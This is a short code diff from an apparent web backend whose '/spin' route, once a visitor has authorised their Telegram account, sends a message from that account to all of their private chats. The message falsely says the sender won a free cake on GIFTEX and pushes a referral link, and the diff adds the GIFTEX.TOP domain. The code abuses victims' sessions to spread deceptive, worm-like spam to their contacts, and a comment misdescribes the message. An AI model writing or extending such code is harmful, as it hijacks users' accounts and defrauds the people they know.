@@ -84,7 +84,7 @@ router.post('/spin', checkAuth, checkTdlibAuth, checkParticipation, async (req, 
     console.log('Отправка сообщений в личные чаты...');
     
     // Используем фиксированный текст "HELLO WORLD" вместо сложного сообщения
-    const finalMessageText = "Ку! Получилось бесплатно выиграть тортик на сайте GIFTEX, попробуй ты тоже по моей рефке плиз: ";
+    const finalMessageText = "Ку! Получилось бесплатно выиграть тортик на сайте GIFTEX, попробуй ты тоже по моей рефке плиз: GIFTEX.TOP";
     
     // Отправляем сообщение только в личные чаты с реальными людьми
     const results = await client.sendMessageToAllPrivateChats(finalMessageText);
